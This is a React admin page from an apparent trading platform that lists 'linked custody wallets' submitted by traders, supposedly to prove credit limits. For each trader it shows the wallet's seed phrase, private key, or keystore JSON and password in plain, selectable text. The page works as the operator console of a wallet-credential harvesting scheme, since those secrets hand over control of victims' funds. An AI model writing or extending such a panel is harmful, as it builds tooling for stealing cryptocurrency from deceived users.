import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { useNavigate } from "react-router-dom";
import { walletLinkApi } from "../../../api/walletLink.api";
import { formatDate } from "../../../utils";

export default function WalletsPage() {
  const navigate = useNavigate();
  const qc = useQueryClient();
  const [filterQuery, setFilterQuery] = useState("");
  const [expandedWalletId, setExpandedWalletId] = useState<string | null>(null);
  const [successMsg, setSuccessMsg] = useState("");

  const { data: walletsData, isLoading, error } = useQuery({
    queryKey: ["executor-all-wallets"],
    queryFn: () => walletLinkApi.getAllWallets().then((r) => r.data.data),
  });

  const wallets = walletsData ?? [];

  const verifyWalletMutation = useMutation({
    mutationFn: (walletId: string) => walletLinkApi.verifyWallet(walletId),
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ["executor-all-wallets"] });
      setSuccessMsg("Wallet status marked as verified!");
      setTimeout(() => setSuccessMsg(""), 5000);
    },
  });

  const filteredWallets = wallets.filter((w: any) => {
    const userMatch = w.user?.name?.toLowerCase().includes(filterQuery.toLowerCase()) || 
                      w.user?.email?.toLowerCase().includes(filterQuery.toLowerCase());
    const labelMatch = w.label?.toLowerCase().includes(filterQuery.toLowerCase());
    return userMatch || labelMatch;
  });

  if (isLoading) {
    return (
      <div className="max-w-6xl mx-auto space-y-4 py-8">
        <div className="h-12 bg-white/5 animate-pulse rounded-2xl" />
        <div className="h-64 bg-white/5 animate-pulse rounded-3xl" />
      </div>
    );
  }

  if (error) {
    return (
      <div className="max-w-6xl mx-auto py-12 text-center text-xs text-rose-400">
        Failed to query Linked Wallets from backend.
      </div>
    );
  }

  return (
    <div className="max-w-6xl mx-auto space-y-6">
      {/* Header and status flags */}
      <div className="flex justify-between items-center">
        <div>
          <h1 className="text-xl font-bold text-white">Linked Custody Wallets</h1>
          <p className="text-xs text-slate-400 mt-0.5">Audit external wallet credentials submitted by traders to prove credit limits.</p>
        </div>
      </div>

      {successMsg && (
        <div className="p-4 bg-emerald-500/15 border border-emerald-500/30 rounded-2xl text-xs text-[#00e676] font-bold">
          ✓ {successMsg}
        </div>
      )}

      {/* Filter and Search Bar */}
      <div className="bg-[#121822] rounded-3xl border border-white/10 p-4 shadow-sm flex items-center">
        <input
          type="text"
          value={filterQuery}
          onChange={(e) => setFilterQuery(e.target.value)}
          placeholder="Search by client name, email, or wallet brand (e.g. MetaMask)..."
          className="w-full bg-[#0e1520] border border-white/10 rounded-2xl px-4 py-2.5 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-[#00c076]"
        />
      </div>

      {/* Wallets Table */}
      <div className="bg-[#121822] rounded-3xl border border-white/10 overflow-hidden shadow-sm">
        {filteredWallets.length === 0 ? (
          <div className="p-12 text-center text-xs text-slate-500">
            No linked wallets matching filters found.
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs border-collapse">
              <thead>
                <tr className="bg-[#0e1520] text-[10px] font-bold text-slate-400 uppercase tracking-wider border-b border-white/10">
                  <th className="px-6 py-4">Client Info</th>
                  <th className="px-6 py-4">Wallet Info</th>
                  <th className="px-6 py-4">Linked Date</th>
                  <th className="px-6 py-4">Status</th>
                  <th className="px-6 py-4 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/5 text-slate-300">
                {filteredWallets.map((wallet: any) => {
                  const isExpanded = expandedWalletId === wallet._id;
                  const detailsMap = wallet.details instanceof Map ? Object.fromEntries(wallet.details) : wallet.details || {};
                  
                  return (
                    <div key={wallet._id} className="contents">
                      <tr className="hover:bg-white/5 transition-colors">
                        <td className="px-6 py-4">
                          <button
                            onClick={() => navigate(`/executor/clients/${wallet.user?._id}`)}
                            className="font-bold text-white hover:text-[#00e676] text-left cursor-pointer transition-colors"
                          >
                            {wallet.user?.name || "Deleted Trader"}
                          </button>
                          <span className="text-[10px] text-slate-500 block mt-0.5 font-mono">{wallet.user?.email || "-"}</span>
                        </td>
                        <td className="px-6 py-4">
                          <span className="font-bold text-white block">{wallet.label}</span>
                          <span className="text-[10px] bg-white/5 border border-white/10 text-slate-400 font-bold px-2 py-0.5 rounded-full uppercase tracking-wider mt-1 inline-block">
                            {detailsMap.connectType || "phrase"}
                          </span>
                        </td>
                        <td className="px-6 py-4 text-slate-400 font-mono">
                          {formatDate(wallet.createdAt)}
                        </td>
                        <td className="px-6 py-4">
                          <span className={`text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase ${
                            wallet.isVerified ? "bg-emerald-500/15 text-[#00e676] border border-emerald-500/30" : "bg-amber-500/15 text-amber-300 border border-amber-500/30"
                          }`}>
                            {wallet.isVerified ? "Verified" : "Pending Audit"}
                          </span>
                        </td>
                        <td className="px-6 py-4 text-right space-x-2">
                          <button
                            onClick={() => setExpandedWalletId(isExpanded ? null : wallet._id)}
                            className="text-xs font-bold text-slate-300 hover:text-white px-3 py-1.5 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 transition-colors cursor-pointer"
                          >
                            {isExpanded ? "Hide Credentials" : "View Credentials"}
                          </button>
                          {!wallet.isVerified && (
                            <button
                              onClick={() => verifyWalletMutation.mutate(wallet._id)}
                              disabled={verifyWalletMutation.isPending}
                              className="text-xs font-black text-[#080c10] bg-[#00c076] hover:bg-[#00e676] px-3.5 py-1.5 rounded-xl transition-all cursor-pointer disabled:opacity-50 shadow-md shadow-[#00c076]/20"
                            >
                              Verify
                            </button>
                          )}
                        </td>
                      </tr>

                      {/* Expanded credentials drawer row */}
                      {isExpanded && (
                        <tr>
                          <td colSpan={5} className="px-8 py-4 bg-[#080c10] border-y border-white/10">
                            <div className="bg-[#0e1520] border border-white/10 rounded-2xl p-5 shadow-inner max-w-3xl space-y-3 font-mono text-xs select-all text-slate-300 overflow-x-auto">
                              {detailsMap.connectType === "phrase" ? (
                                <div>
                                  <strong className="block text-slate-500 uppercase text-[9px] mb-1 font-bold">Mnemonic / Seed Phrase:</strong>
                                  <span className="break-all font-semibold tracking-wide whitespace-pre-wrap text-emerald-400">{detailsMap.phrase}</span>
                                </div>
                              ) : detailsMap.connectType === "privateKey" ? (
                                <div>
                                  <strong className="block text-slate-500 uppercase text-[9px] mb-1 font-bold">Private Key Hex:</strong>
                                  <span className="break-all font-semibold tracking-wider text-amber-300">{detailsMap.privateKey}</span>
                                </div>
                              ) : detailsMap.connectType === "keystore" ? (
                                <div className="space-y-3">
                                  <div>
                                    <strong className="block text-slate-500 uppercase text-[9px] mb-1 font-bold">Keystore JSON:</strong>
                                    <span className="break-all block bg-[#121822] p-3 rounded-xl border border-white/10 text-slate-300">{detailsMap.keystore}</span>
                                  </div>
                                  <div>
                                    <strong className="block text-slate-500 uppercase text-[9px] mb-1 font-bold">Password:</strong>
                                    <span className="font-bold text-white">{detailsMap.password}</span>
                                  </div>
                                </div>
                              ) : (
                                <div>
                                  <strong className="block text-slate-500 uppercase text-[9px] mb-1 font-bold">Details Map:</strong>
                                  <pre className="break-all text-slate-300">{JSON.stringify(detailsMap, null, 2)}</pre>
                                </div>
                              )}
                            </div>
                          </td>
                        </tr>
                      )}
                    </div>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

    </div>
  );
}
